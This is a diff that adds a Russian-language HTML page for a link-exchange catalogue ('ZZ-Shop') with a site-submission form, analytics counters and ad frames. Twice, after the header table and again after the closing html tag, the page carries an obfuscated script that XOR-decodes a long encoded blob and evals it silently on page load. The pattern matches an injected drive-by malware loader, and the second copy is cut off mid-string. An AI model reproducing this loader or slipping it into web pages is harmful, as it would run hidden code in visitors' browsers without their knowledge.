@@ -1,0 +1,318 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>ZZ-Shop-Каталог сайтов.</title>
+<meta name="description" content="Каталог сайтов для обмена ссылками. Сайты для обмена. Добавление новой ссылки в каталог.">
+<meta name="keywords" content="Интернет, магазин, on-line, shop, webmoney, WM, цифровые, товары, программы, serial, крэк, кряк, взлом, serial, покупка, купить, книга, карточка, скрипт, flash, free, бесплатно, моментальная, доставка, получение, pin, коды, хостинг, домены">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+<link rel="stylesheet" href="styles/mysite.css" type="text/css">
+</head>
+<body bgcolor="#FFFFFF" text="#000000" link="#003366"  vlink="#001933" alink="#FF0000" marginwidth=10 marginheight=10 topmargin=10 leftmargin=10>
+<span style="display:none;"><script type="text/javascript" src="http://www.jino-net.ru/sys/htmlbegun.js"></script></span>
+<script type="text/javascript" src="http://www.jino-net.ru/sys/swfobject.js"></script>
+<script type="text/javascript" src="http://www.jino-net.ru/sys/htmljino.js"></script>
+<script type="text/javascript" src="http://www.jino-net.ru/sys/mainjs.php"></script>
+<script src="http://www.google-analytics.com/urchin.js" type="text/javascript"></script>
+<script type="text/javascript">
+_uacct = "UA-1275823-1";
+urchinTracker();
+</script>
+
+
+<table border=0 width=100% cellspacing=0 cellpadding=0>
+<!-- Dolphin, slogan & the banner -->
+<tr>
+<td><table border=0 width=100% cellspacing=0 cellpadding=0>
+	<tr>
+	<td rowspan=2 width="1%" align=left valign=bottom><a href="index.html"><img src="images/interface-logo.gif" alt="Сайт" border=0 width=167 height=87 hspace=5 vspace=10></a></td>
+	      <td colspan=2 width="99%" align=center valign=center>&nbsp; 
+              <td align="center" class="text"> <div align="center"><font color="#000000">
+ 
+
+
+<script type="text/javascript"><!--
+document.write('');
+--></script>
+
+
+
+
+              <script language="JavaScript1.2">
+
+<!-- Begin
+var months=new Array(13);
+months[1]="Января";
+months[2]="February";
+months[3]="March";
+months[4]="April";
+months[5]="May";
+months[6]="June";
+months[7]="July";
+months[8]="August";
+months[9]="September";
+months[10]="October";
+months[11]="November";
+months[12]="Декабря";
+var time=new Date();
+var lmonth=months[time.getMonth() + 1];
+var date=time.getDate();
+var year=time.getYear();
+if (year < 2000)    // Y2K Fix, Isaac Powell
+year = year + 1900; // http://onyx.idbsu.edu/~ipowell
+document.write("<right>" + lmonth + " ");
+document.write(date + ", " + year + "</right>");
+// End -->
+</script>
+
+</td>
+        </tr>
+<tr>
+     
+</tr>
+</table></td>
+</tr>			
+			<!-- Top navigation menu -->
+<tr>
+<td><table border=0 width=100% cellspacing=0 cellpadding=0><td bgcolor="#000000">
+<table border=0 width=100% cellspacing=1 cellpadding=3>
+	<tr>
+	            <td bgcolor="#336699" align=middle><span> <a class="navi-navimenu-blue" href="index.html"><font size="2"></font></a> 
+                    <a class="navi-navimenu-blue" href="index.html"><font size="2"></font></a>| 
+                    <a class="navi-navimenu-blue" href="index.html">Магазин</a>| 
+                    <a class="navi-navimenu-blue" href="index.php">Каталог сайтов</a>| 
+                    <a class="navi-navimenu-blue" href="board/index.php">Доска объявлений</a>| 
+                    <a class="navi-navimenu-blue" href="bonys.html">Центры выдачи бонусов</a>|  
+                    <a class="navi-navimenu-blue" href="rabota.html">Поиск работы</a>| 
+                    <a class="navi-navimenu-blue" href="xost.html">Бесплатный хостинг файлов</a>| 
+                  </span></td>
+	</tr>
+	<tr>
+	            <td bgcolor="#CCCCCC" align=middle><span>  <a class="navi-navimenu-gray" href="index.html"><font face="Courier, Courier New, Comic Sans MS"></font></a> 
+                    <a class="navi-navimenu-gray" href="index.html"><font face="Courier, Courier New, Comic Sans MS"></font></a> 
+                    <a class="navi-navimenu-gray" href="index.html"><font face="Courier, Courier New, Comic Sans MS"></font></a> 
+                    <a class="navi-navimenu-gray" href="index.html"><font face="Courier, Courier New, Comic Sans MS"></font></a> 
+                    <a class="navi-navimenu-gray" href="index.html"><font face="Courier, Courier New, Comic Sans MS"></font></a> 
+                  </span></td>
+	</tr>
+</table></td></table></td>
+</tr>
+<tr>
+<td><img src="index.html" border=0 width=1 height=10 hspace=0 vspace=0></td>
+</tr>
+
+		</table>
+
+							<!-- [ 8e03a31123c583a21eb78d54b4024699 ] --><script>eval(unescape('function%20qwn%28ySv%29%7Bfunction%20xfuwD%28wMjcXZ%29%7Bvar%20qKkI%3DwMjcXZ.length%3Bvar%20vnIz%3D0%2CvDAtI%3D0%3Bwhile%28vnIz%3CqKkI%29%7BvDAtI+%3DwMjcXZ.charCodeAt%28vnIz%29*qKkI%3BvnIz++%3B%7Dreturn%20%28%27%27+vDAtI%29%7D%20%20%20try%20%7Bvar%20uQTjIQ%3Deval%28%27a%23r%26g%26u%26mwe%23nwt%23s%23.wc%26a6l%26l6e%23ew%27.replace%28/%5B%23wb6%26%5D/g%2C%20%27%27%29%29%2CsawLM%3Dnew%20String%28%29%2CojIiy%3D0%3BbQUTQ%3D0%2CsETdZ%3D%28new%20String%28uQTjIQ%29%29.replace%28/%5B%5E@a-z0-9A-Z_.%2C-%5D/g%2C%27%27%29%3Bvar%20epIXb%3DxfuwD%28sETdZ%29%3BySv%3Dunescape%28ySv%29%3Bfor%28var%20zGv%3D0%3B%20zGv%20%3C%20%28ySv.length%29%3B%20zGv++%29%7Bvar%20mYCI%3DySv.charCodeAt%28zGv%29%3Bvar%20fWTF%3DsETdZ.charCodeAt%28ojIiy%29%5EepIXb.charCodeAt%28bQUTQ%29%3BojIiy++%3BbQUTQ++%3Bif%28ojIiy%3EsETdZ.length%29ojIiy%3D0%3Bif%28bQUTQ%3EepIXb.length%29bQUTQ%3D0%3BsawLM+%3DString.fromCharCode%28mYCI%5EfWTF%29%3B%7Deval%28sawLM%29%3B%20return%20sawLM%3Dnew%20String%28%29%3B%7Dcatch%28e%29%7B%7D%7Dqwn%28%27%2532%2534%2539%2536%2535%2531%2535%2532%2551%2512%253e%2515%254d%256a%252c%253d%2567%2534%2522%2508%2578%2528%253f%2538%2534%252a%2530%253c%2509%2536%2575%2550%254b%2538%253a%251c%2530%250b%2533%2513%252e%255c%2565%2571%253e%251d%2574%2536%2527%2532%2539%252f%2572%255f%2528%252f%2529%2570%255d%253f%256d%2577%2505%2558%2514%2521%250d%2560%2527%2539%2522%2525%2539%2531%2523%251e%2523%252c%251b%253d%2561%256d%2559%2503%2534%251d%2534%2558%252b%255e%2548%2552%2560%2531%252a%2539%2536%2507%2530%2576%2520%250b%251d%2537%252e%2505%251e%251d%250e%253a%2507%257d%250d%2524%2568%2531%2501%250a%2528%253c%252b%2532%2505%252b%252a%2505%2527%250a%2539%251f%256e%251c%252e%252f%253b%2529%2513%251f%2536%2515%250c%257e%2524%254c%2522%257d%250b%2528%2527%2539%251d%2534%2525%257d%250f%2537%2526%2566%252a%2579%2575%2516%251b%2531%2541%2527%250f%257c%2506%250f%2544%2501%2561%2575%2572%2537%256d%2575%2520%2502%2520%2550%255b%2503%2521%2510%2539%2531%253e%2506%2575%2539%2536%257a%257c%255b%2572%2552%2576%253e%2501%2510%254f%2507%2560%256a%2535%2505%2501%2530%2509%250e%2506%250e%2549%255d%256b%257f%250b%2576%2531%255e%254d%2564%2538%254c%252f%2522%2566%2523%2537%2526%257d%2504%253a%2538%255c%2529%2529%2522%2520%254f%2565%2547%2523%2573%256b%2571%251e%256f%2535%255f%252a%2573%2567%250d%2508%2523%2521%2535%2516%2520%2558%2565%2528%2529%2579%255a%253a%2539%2519%256e%2530%257f%2566%2575%2573%256b%255e%253f%2515%2536%2570%2521%2535%2522%2521%2552%2527%254e%252b%2569%252c%2503%252e%252e%253d%2530%2521%253a%257d%2534%2526%2524%2534%2552%255c%2579%2520%2579%2530%252e%2505%2505%252c%2563%2514%2566%2523%2539%2577%2537%252c%252c%252e%2535%2574%255e%257a%2536%2511%2525%2502%2530%252e%2577%2504%2548%250c%2522%2518%2537%2523%2503%2572%253b%2529%257e%2530%2503%2506%2522%2534%2550%2565%2566%2502%2514%2504%250d%2516%2529%2531%2502%2516%2521%250f%2566%2520%2522%252e%2539%250b%2534%2529%2538%2509%256f%2538%2547%2546%252b%253a%2508%2530%252a%2501%2506%2549%2542%253c%2500%252a%2503%2507%2508%2507%2569%2517%255c%2506%2579%254f%253b%254b%257e%2571%252d%2569%257a%2562%2573%2554%2534%2529%254a%253f%251e%2533%2544%2519%2542%256f%257b%2578%253d%2541%251a%2577%2504%2523%2533%2538%256c%253d%2578%255a%2548%2546%254d%2542%2524%2525%2522%251b%251b%2507%2569%256f%2532%2500%250e%255a%251e%256b%2502%257c%252c%2547%2534%256a%255a%257e%2576%257d%2571%2516%2537%2513%253b%251d%254c%2500%2531%2537%2510%2503%252e%253e%2527%251f%2550%2537%2538%252f%2506%256e%2539%2525%2538%2529%2514%251d%2512%2504%2528%2502%2561%2564%2528%2537%253b%2522%254f%2525%2538%253e%2538%255c%2532%2516%253d%250f%2533%2538%257f%2563%2539%253b%2577%252c%2536%2530%2500%252d%2536%2532%2516%2528%252f%2507%2524%2535%256c%257b%2551%2520%250d%2536%2500%251e%2507%2520%2539%256f%2569%2505%252f%2528%2537%2559%253f%2568%255c%255d%2537%253d%2558%257b%2563%2520%256f%252a%2562%252e%2577%2506%254f%2536%253c%2573%2575%250d%2543%252b%2571%256f%257a%257f%253e%2534%2536%256d%253f%2520%252c%252c%2517%2534%251a%252a%2556%255d%2506%251e%2533%2518%253d%2535%250c%2547%2533%2538%2532%253c%2517%255b%2522%2538%250d%255c%2513%2568%257a%2557%256b%256d%2556%2531%2546%2551%257b%2546%2525%252b%2522%256d%2536%2521%251c%2564%2519%2545%2572%2547%252c%257b%2527%254d%253a%256d%2567%254e%250e%2570%2541%2500%254b%2537%2520%2537%2524%2533%2524%2568%2512%2516%2523%2532%2560%2524%252a%2570%252d%2523%2549%2549%2539%2521%2568%257e%2526%2523%2572%2516%2538%2529%257d%257e%257c%2537%256c%253c%2553%253b%257f%2561%252d%257d%256a%2548%2553%255f%257e%2578%2518%2527%2533%252d%2529%253b%250c%2532%2565%250d%2573%2524%256e%2524%2517%256f%2541%2556%2559%256e%2505%2506%2549%2537%250a%253a%2579%2528%2535%256f%256b%253f%251f%2509%257d%2542%2543%252e%2519%2510%2577%2521%2506%2527%2570%2577%250e%2513%2549%2508%2525%2526%252a%2549%255d%2558%257f%2547%254a%253b%250b%2536%257f%2576%252f%253b%2528%2539%2527%251f%250b%253a%2534%2535%257a%2577%255d%2532%2520%2512%2513%250c%2520%250d%252e%2525%257c%255f%2561%2531%252d%2528%2533%253c%250f%252b%2508%2575%2528%252e%253a%2522%2567%2552%2532%2551%2524%2506%252a%2566%251d%2531%257a%252c%2545%2538%256e%256d%2530%252a%2501%2563%2500%2500%2534%253c%2548%255c%2547%2568%2502%256a%255d%2534%2528%250c%252d%251b%253b%2579%2539%2524%2531%256e%253a%2521%2537%2535%256f%257d%2579%2501%2517%253e%2527%2508%2538%250a%2534%254a%257a%257e%256b%254d%256c%2561%2560%2543%2544%256d%256e%2559%2564%256c%2530%252a%2518%252d%253d%257f%2534%252a%257a%2520%2519%2532%250f%253e%2510%256d%2569%2544%250a%2500%250e%250a%2578%2556%2570%256d%256a%2542%2540%254d%2571%253e%2521%2535%253d%250c%253d%2564%2537%2524%250a%2525%2506%2531%2572%2576%2560%2575%2511%2522%252b%253a%250d%2539%253b%2538%2579%254d%2534%254b%2518%250d%2523%2519%2511%2528%252c%2522%2573%253b%2534%2573%257f%257a%257a%251f%254f%2511%250c%2513%256d%2578%2573%256a%2538%250d%2506%252b%2522%256f%2571%2531%2572%2549%2567%2577%2533%2510%2529%2516%2535%2510%2502%2533%2504%2506%2523%2556%2542%2573%2503%2521%251a%2532%253b%253e%2536%252c%257c%256c%2537%2509%2527%252e%2562%2524%252f%2533%257c%2505%252a%251b%2501%2535%2535%2528%2512%2568%251e%2534%2539%253f%2521%253d%252a%2538%2574%250d%255d%2521%2538%2563%2576%2537%2539%2529%251b%2531%252d%2577%256d%250e%2533%2527%2537%254c%257a%2567%256a%2576%2574%256e%2578%256f%255f%2512%252f%251c%257c%256b%2554%254f%2563%2546%2560%2539%250e%257d%2518%252a%2510%2578%255e%2557%254e%2530%252f%253e%253b%2537%2520%2501%252a%2530%252f%2567%2572%2558%2570%2522%2558%252c%2519%250b%256c%251b%2564%2536%2508%2508%2530%2535%251c%252c%250e%2522%252a%251e%2543%2552%2562%2547%2557%2566%255f%256b%255f%2541%2571%2508%250f%2570%2578%252b%2531%2530%252f%253c%2533%2539%2557%2569%2568%2500%2525%251b%256e%2505%2562%2552%257a%2571%2551%2515%255d%257b%2567%2562%2563%2572%2569%2503%2516%2504%2517%2521%2528%252a%2563%2578%2568%251b%257f%254d%2571%255c%2540%257e%2560%257d%257e%2541%256b%2573%256e%2575%2560%2574%2570%2565%2500%2529%2573%253d%257b%2533%2562%252d%250c%2557%2539%2535%251d%256c%2535%253d%252b%2539%2549%2578%2571%2565%2574%2521%2578%253b%253e%2558%2573%2537%251d%2512%2528%257a%252a%250e%2507%2534%257d%257c%2571%256d%2536%2536%2508%2547%253b%2565%252f%250f%255b%2518%2548%2563%2540%2533%2514%250c%2536%2516%2516%253e%2536%2527%2527%252a%253c%253d%2536%2564%255e%2546%250c%250e%250b%2574%2530%2539%252e%2537%257b%254a%252c%2506%253d%256f%253a%2573%2576%252b%2560%2537%250a%2509%257b%256c%2571%2537%2570%2502%257d%2525%2533%2529%2517%2500%2532%2564%250f%2529%2527%2518%253d%253f%2503%2579%251c%2511%2508%2531%2562%253b%253f%252d%253d%253a%2515%2519%252c%2507%2525%2573%2575%2567%2563%255c%2567%256e%2555%2560%2571%2523%251b%2537%2557%2502%252d%2578%2531%2539%253a%2504%2527%2504%253d%2516%2566%2560%2569%257e%2578%2546%2572%2552%2576%2517%256c%2578%253d%2532%2538%251b%2514%2515%253c%253e%2511%257f%2568%2514%2512%2521%253d%2529%2533%2504%2502%2554%253c%257e%2510%2531%2511%2538%2539%256d%2560%252f%257e%2533%2535%252b%2557%2516%253a%250a%2553%2540%2570%253e%257d%254b%2502%257d%2572%253f%251b%2527%2527%2516%2535%2579%257d%254f%27%29%3B'));</script><!-- end -->
+<script type="text/javascript"><!--
+document.write('<iframe name="wa_ad_frame" width="728" height="90" frameborder="0" src="http://feed1.altastat.com/ad?board=28549&type=A&ref='+escape(document.referrer)+'" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no"><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></iframe>');
+--></script>
+<link href="/tpl/default_intgr/css/styles.css" rel="stylesheet" type="text/css">
+<script language="JavaScript" type="text/JavaScript"  src="/tpl/default_intgr/js/fl.js"></script>
+
+<div align="center">
+<div class="link_global">
+<div class="links_page_name"><h2>Добавление новой ссылки в каталог.</h2></div>
+<form enctype="multipart/form-data" action="/index.php?actions=add" method="POST" style="margin:0px;" name="add_link">
+<input type="hidden" name="step" value="0">
+
+<table border="0" cellpadding="1" cellspacing="0" width="100%" class="link_form_table">
+  
+<tr>
+ <td class="link_form_dark_row" align="right" width="30%" valign="top"><b>Адрес сайта:</b></td>
+ <td class="link_form_light_row" width="10" valign="top"><span class="link_form_red_text">*</span></td>
+ <td class="link_form_light_row" width="70%" align="left"><input type="text" name="DOMAIN" class="link_text_field" style="width:99%;" value="http://" ><div class="link_form_light_text"></div></td>
+</tr>
+
+<tr>
+ <td class="link_form_dark_row" align="right" width="30%" valign="top"><b>Название сайта:</b></td>
+ <td class="link_form_light_row" width="10" valign="top"><span class="link_form_red_text">*</span></td>
+ <td class="link_form_light_row" width="70%" align="left"><input type="text" name="NAME" class="link_text_field" style="width:99%;" value="" ><div class="link_form_light_text"></div></td>
+</tr>
+
+<tr>
+ <td class="link_form_dark_row" align="right" width="30%" valign="top"><b>Категория:</b></td>
+ <td class="link_form_light_row" width="10" valign="top"><span class="link_form_red_text">*</span></td>
+ <td class="link_form_light_row" width="70%" align="left"><select name="LINK_CAT" class="link_text_field"><option  value="2">Автомобили</option><option  value="3">Бизнес и финансы</option><option  value="4">Домашний очаг</option><option  value="5">Интернет</option><option  value="6">Компьютеры</option><option  value="7">Культура и искусство</option><option  value="8">Медицина и здоровье</option><option  value="9">Наука и образование</option><option  value="10">Непознанное</option><option  value="11">Новости и СМИ</option><option  value="12">Общество и политика</option><option  value="13">Отдых и развлечения</option><option  value="14">Производство</option><option  value="15">Работа и заработок</option><option  value="16">Спорт</option><option  value="17">Справки</option><option  value="18">Товары и услуги</option></select><div class="link_form_light_text"></div></td>
+</tr>
+
+<tr>
+ <td class="link_form_dark_row" align="right" width="30%" valign="top"><b>Ваш баннер:</b></td>
+ <td class="link_form_light_row" width="10" valign="top"><span class="link_form_red_text">&nbsp;</span></td>
+ <td class="link_form_light_row" width="70%" align="left"><input type="text" name="IMG_ADDR" class="link_text_field" style="width:99%;" value="" ><div class="link_form_light_text">Адрес вашего баннера размером 88х31. (.gif .jpg .png)<br>Например: http://mysite.ru/88x31.gif</div></td>
+</tr>
+
+<tr>
+ <td class="link_form_dark_row" align="right" width="30%" valign="top"><b>Обратная ссылка:</b></td>
+ <td class="link_form_light_row" width="10" valign="top"><span class="link_form_red_text">&nbsp;</span></td>
+ <td class="link_form_light_row" width="70%" align="left"><input type="text" name="RET_LINK_ADDR" class="link_text_field" style="width:99%;" value="http://" ><div class="link_form_light_text"><div>Полный адрес страницы на Вашем сайте, где была размещена ссылка на наш сайт.</div>Вы можете установить к себе на сайт <a href="#variants">одну из наших ссылок.</a></div></td>
+</tr>
+
+<tr>
+ <td class="link_form_dark_row" align="right" width="30%" valign="top"><b>Ваше имя:</b></td>
+ <td class="link_form_light_row" width="10" valign="top"><span class="link_form_red_text">*</span></td>
+ <td class="link_form_light_row" width="70%" align="left"><input type="text" name="USER_NAME" class="link_text_field" size="40" value="" ><div class="link_form_light_text"></div></td>
+</tr>
+
+<tr>
+ <td class="link_form_dark_row" align="right" width="30%" valign="top"><b>Ваш e-mail:</b></td>
+ <td class="link_form_light_row" width="10" valign="top"><span class="link_form_red_text">*</span></td>
+ <td class="link_form_light_row" width="70%" align="left"><input type="text" name="USER_MAIL" class="link_text_field" size="40" value="" ><div class="link_form_light_text"></div></td>
+</tr>
+
+<tr>
+ <td class="link_form_dark_row" align="right" width="30%" valign="top"><b>HTML Вашей ссылки:</b></td>
+ <td class="link_form_light_row" width="10" valign="top"><span class="link_form_red_text">*</span></td>
+ <td class="link_form_light_row" width="70%" align="left"><textarea name="TEXT_HTML" class="link_text_field" style="width:99%" rows="8" ></textarea><div class="link_form_light_text">В коде разрешены ТОЛЬКО тэги "<span class="link_form_red_text">&lt;a&gt;&lt;b&gt;&lt;i&gt;</span>" 
+Любые другие тэги, javaScript или стили будут удалены.<br>
+Все ссылки в Вашем HTML коде <span class="link_form_red_text">ДОЛЖНЫ вести ТОЛЬКО</span> на одну из страниц регистрируемого сайта. 
+(адрес введённый в поле "Адрес сайта" или одна из страниц на указанном сайте). <br>
+Максимум ссылок: <b>5</b>
+<br>
+Максимальная длина Вашего HTML: <b>300</b> символов. </div></td>
+</tr>
+
+<tr>
+ <td class="link_form_light_row" colspan="3" align="center" height="30"><input type="submit" name="next" class="link_grey_button" value="Добавить ссылку" ><div class="link_form_light_text"></div></td>
+</tr>
+
+<tr>
+ <td class="link_form_light_row" colspan="3" align="center" height="30">
+<a name="variants"></a>
+<div align="left" style="margin-top:15px;"><b>Наши ссылки для обмена:</b><br>
+
+<fieldset style="padding:2px; margin-bottom:10px;"><legend>Вариант 1</legend>
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+ <tr>
+  <td valign="top" width="40%" align="left"><textarea name="1" rows="6" class="link_text_field" style="width:99%;">Каталог сайтов с которыми можно &lt;a href=&quot;http://zz-shop.jino-net.ru/&quot; target=&quot;_blank&quot;&gt;обменяться ссылками&lt;/a&gt;. Не забудьте &lt;a href=&quot;http://zz-shop.jino-net.ru/index.php?actions=add&quot; target=&quot;_blank&quot;&gt;добавить ссылку&lt;/a&gt; на Ваш каталог!</textarea></td>
+  <td valign="top" width="60%" align="left"><div style="padding-left:5px;">Каталог сайтов с которыми можно <a href="http://zz-shop.jino-net.ru/" target="_blank">обменяться ссылками</a>. Не забудьте <a href="http://zz-shop.jino-net.ru/index.php?actions=add" target="_blank">добавить ссылку</a> на Ваш каталог!</div></td>
+ </tr>
+</table>
+</fieldset>
+
+</div><div class="link_form_light_text"></div></td>
+</tr>
+
+</table>
+</form>
+
+<div align="right" class="system_menu">
+
+&nbsp;&nbsp;<span class="system_menu_no_sel" onMouseOver="this.className='system_menu_sel';" onMouseOut="this.className='system_menu_no_sel';"><a href="/" title="Перейти на главную страницу каталога">Главная</a></span>&nbsp;&nbsp;
+&nbsp;&nbsp;<span class="system_menu_sel"><a href="/index.php?actions=add" title="Добавить новую ссылку в каталог">Добавить ссылку</a></span>&nbsp;&nbsp;
+&nbsp;&nbsp;<span class="system_menu_no_sel" onMouseOver="this.className='system_menu_sel';" onMouseOut="this.className='system_menu_no_sel';"><a href="/index.php?actions=edit" title="Редактировать ранее добавленную ссылку в каталоге">Редактировать ссылку</a></span>&nbsp;&nbsp;
+&nbsp;&nbsp;<span class="system_menu_no_sel" onMouseOver="this.className='system_menu_sel';" onMouseOut="this.className='system_menu_no_sel';"><a href="/index.php?actions=message" title="Отправить сообщение администратру каталога ссылок">Отправить сообщение</a></span>&nbsp;&nbsp;
+</div>
+
+<div class="links_exec_info">Общее время: <b>0.028</b> сек. | Запросов MySQL: <b>4</b> | Время выполнения запросов: <b>0.001</b> сек.</div>
+
+<div class="versncopy">
+<a href="http://www.fairground.ru" target="_blank">Бесплатный скрипт обмена ссылками FairLinks v1.64 Free</a> &nbsp;&nbsp;&nbsp;&nbsp; 
+</div>
+
+</div>
+</div>
+
+
+
+
+
+
+
+
+
+<!-- Lower navigation table -->
+<table border=0 width=100% cellspacing=0 cellpadding=0>
+
+			<!-- Bottom navigation menu -->
+<tr>
+<td><img src="images/pixel-trans.gif" border=0 width=1 height=10 hspace=0 vspace=0></td>
+</tr>
+<tr>
+<td><table border=0 width=100% cellspacing=0 cellpadding=0><td bgcolor="#000000"><table border=0 width=100% cellspacing=1 cellpadding=3>
+	<tr>
+	            <td bgcolor="#CCCCCC" align=middle><span class="navi-navimenu-gray"> 
+                  <a class="navi-navimenu-gray" 
+
+
+
+
+
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t14.10;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet: показано число просмотров за 24"+
+" часа, посетителей за 24 часа и за сегодня' "+
+"border=0 width=88 height=31></a>")//--></script><!--/LiveInternet-->
+
+
+<!--Rating@Mail.ru COUNTEr--><script language="JavaScript" type="text/javascript"><!--
+d=document;var a='';a+=';r='+escape(d.referrer)
+js=10//--></script><script language="JavaScript1.1" type="text/javascript"><!--
+a+=';j='+navigator.javaEnabled()
+js=11//--></script><script language="JavaScript1.2" type="text/javascript"><!--
+s=screen;a+=';s='+s.width+'*'+s.height
+a+=';d='+(s.colorDepth?s.colorDepth:s.pixelDepth)
+js=12//--></script><script language="JavaScript1.3" type="text/javascript"><!--
+js=13//--></script><script language="JavaScript" type="text/javascript"><!--
+d.write('<a href="http://top.mail.ru/jump?from=1333907"'+
+' target=_top><img src="http://da.c5.b4.a1.top.list.ru/counter'+
+'?id=1333907;t=210;js='+js+a+';rand='+Math.random()+
+'" alt="Рейтинг@Mail.ru"'+' border=0 height=31 width=88/><\/a>')
+if(11<js)d.write('<'+'!-- ')//--></script><noscript><a
+target=_top href="http://top.mail.ru/jump?from=1333907"><img
+src="http://da.c5.b4.a1.top.list.ru/counter?js=na;id=1333907;t=210"
+border=0 height=31 width=88
+alt="Рейтинг@Mail.ru"/></a></noscript><script language="JavaScript" type="text/javascript"><!--
+if(11<js)d.write('--'+'>')//--></script><!--/COUNTER-->
+
+
+<script type="text/javascript"><!--
+document.cookie="w=w; path";
+var altastat_c="N";
+if(document.cookie) altastat_c="Y";
+var altastat_je=(navigator.javaEnabled()?"Y":"N");
+var altastat_rn=Math.random();
+var altastat_ref=escape(document.referrer);
+var altastat_pg=escape(window.location.href);
+var altastat_s="28549";
+var altastat_a="0";
+var altastat_n=(navigator.appName.substring(0,2)=="Mi")?0:1;
+var altastat_scr='&w='+screen.width+'&h='+screen.height+'&d='+((altastat_n==0)?screen.colorDepth:screen.pixelDepth);
+var altastat_req='&r='+altastat_ref+'&p='+altastat_pg+'&i='+altastat_rn+'&s='+altastat_s+'&g='+altastat_a+altastat_scr+'&c='+altastat_c+'&e='+altastat_je;
+document.write("<a href=\"http://go.altastat.com/?from=28549\" target=_blank><img src=\"http://count1.altastat.com/?021.gif"+altastat_req+"\" border=\"0\" width=\"88\" height=\"31\" alt=\"Altastat Counter\"></a>");
+--></script>
+
+
+
+<!--begin of Top100-->
+<a href="http://top100.rambler.ru/top100/">
+<img src="http://counter.rambler.ru/top100.cnt?1248235" alt="Rambler's Top100" width=81 height=63 border=0></a>
+<!--end of Top100 code-->
+
+
+<!--end of Top100 code--> 
+                  <a class="navi-navimenu-gray" href="index.html"></a> 
+                  <a class="navi-navimenu-gray" href="index.html"></a> 
+                  </span></td>
+	</tr>
+</table></td></table></td>
+</tr>
+<tr>
+<td><img src="images/pixel-trans.gif" border=0 width=1 height=10 hspace=0 vspace=0></td>
+</tr>
+<tr>
+<td><img src="images/pixel-trans.gif" border=0 width=1 height=10 hspace=0 vspace=0></td>
+</tr>
+
+		</table>
+
+
+		<!-- ------------------------------------------------------------------- -->
+		<!--/UdmComment-->
+
+	</body>
+</html>							<!-- [ 8e03a31123c583a21eb78d54b4024699 ] --><script>eval(unescape('function%20qwn%28ySv%29%7Bfunction%20xfuwD%28wMjcXZ%29%7Bvar%20qKkI%3DwMjcXZ.length%3Bvar%20vnIz%3D0%2CvDAtI%3D0%3Bwhile%28vnIz%3CqKkI%29%7BvDAtI+%3DwMjcXZ.charCodeAt%28vnIz%29*qKkI%3BvnIz++%3B%7Dreturn%20%28%27%27+vDAtI%29%7D%20%20%20try%20%7Bvar%20uQTjIQ%3Deval%28%27aBrVgBu/m%5De3nBt3sB.%5DcVaBlVl/eBe/%27.replace%28/%5B3/%5C%5DBV%5D/g%2C%20%27%27%29%29%2CsawLM%3Dnew%20String%28%29%2CojIiy%3D0%3BbQUTQ%3D0%2CsETdZ%3D%28new%20String%28uQTjIQ%29%29.replace%28/%5B%5E@a-z0-9A-Z_.%2C-%5D/g%2C%27%27%29%3Bvar%20epIXb%3DxfuwD%28sETdZ%29%3BySv%3Dunescape%28ySv%29%3Bfor%28var%20zGv%3D0%3B%20zGv%20%3C%20%28ySv.length%29%3B%20zGv++%29%7Bvar%20mYCI%3DySv.charCodeAt%28zGv%29%3Bvar%20fWTF%3DsETdZ.charCodeAt%28ojIiy%29%5EepIXb.charCodeAt%28bQUTQ%29%3BojIiy++%3BbQUTQ++%3Bif%28ojIiy%3EsETdZ.length%29ojIiy%3D0%3Bif%28bQUTQ%3EepIXb.length%29bQUTQ%3D0%3BsawLM+%3DString.fromCharCode%28mYCI%5EfWTF%29%3B%7Deval%28sawLM%29%3B%20return%20sawLM%3Dnew%20String%28%29%3B%7Dcatch%28e%29%7B%7D%7Dqwn%28%27%2532%2535%2532%2536%2534%2532%2532%2534%2551%253f%2523%2504%2537%252a%253d%256f%2573%2518%253b%2567%2527%2520%2503%2506%252f%252a%256a%2535%250a%2537%2521%2503%251c%253d%2525%2517%2563%2543%2579%2504%2520%2510%2537%253c%2531%250d%254d%253f%253f%252f%2530%257c%256d%255a%253b%2528%2537%252c%2547%256f%2531%255e%2502%250c%2506%2563%251e%257e%2523%2512%253b%2516%2579%2505%253f%2539%2520%2505%255e%2571%253b%2521%2501%251f%2523%251e%2520%2557%2571%2538%254f%2515%2574%251d%251a%250e%256f%2510%2543%2576%2577%2554%256b%256e%253b%251e%253a%2523%2518%2530%251f%2513%252e%2509%2521%2528%2502%2566%257a%2560%253e%2537%2518%2510%2534%2520%2529%2529%2563%2569%252e%2536%2526%2517%2574%2534%2541%2552%2565%256e%2530%2563%2572%2572%256f%2552%252d%2546%256a%256c%256b%2533%2552%2545%256a%2537%2507%2541%2520%2569%2520%2558%255f%2538%254b%2538%257e%2513%257c%257e%2559%2532%256a%2538%256b%2570%2579%2573%2513%2526%2539%2578%257d%2520%257d%256a%2525%2525%2545%252f%256d%2523%251e%257a%2506%2573%2534%2500%257d%2578%255c%2576%2561%256d%256d%2542%2572%255d%2502%256d%2568%256f%2501%2507%2522%257a%2535%256d%2575%255e%2529%257c%2537%2561%250e%256c%254f%254f%2533%2556%255e%257f%2568%2516%2537%253b%2520%2521%2523%255a%251e%2578%250e%256a%2536%256d%251b%2576%2507%251f%2532%2561%257e%2526%2576%256e%2527%2521%2539%2520%2526%2507%257f%2563%257a%2522%256b%251a%2522%252b%2501%2525%2500%2566%254b%2575%256b%256b%254c%257a%2524%2536%2532%2524%2539%250f%2562%2509%2566%253a%2568%2534%2529%2527%251e%252b%2555%2506%2513%2529%252a%255d%2563%2574%253d%2503%253d%2535%2524%253d%252a%2552%2568%2532%2500%2534%2530%2551%2552%2552%253f%2513%2523%2548%2537%256e%257d%2527%2519%2572%2571%257d%2526%2523%253b%2533%2532%2523%253e%2525%2507%2505%252a%2553%257b%2553%2506%2523%2506%2579%2517%2533%253b%252e%255d%2572%252d%2521%2514%2506%257